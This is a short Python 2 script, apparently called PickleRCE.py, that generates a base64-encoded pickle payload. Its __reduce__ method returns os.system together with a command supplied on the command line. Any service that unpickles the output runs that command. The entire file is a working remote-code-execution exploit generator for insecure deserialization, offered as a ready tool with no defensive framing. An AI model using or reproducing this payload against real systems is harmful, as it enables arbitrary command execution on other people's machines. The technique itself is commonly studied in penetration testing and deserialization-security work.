#!/usr/bin/python
import cPickle
import os
import base64
import sys

HELP="""Creates a base64 encoded Pickled object that returns a command.

./PickleRCE.py <command>"""

if len(sys.argv) != 2:
	print(HELP)
	exit(0)

class Rick(object):
	def __reduce__(self):
		return (os.system,(sys.argv[1],))

pickled = cPickle.dumps(Rick())
print(base64.b64encode(pickled))
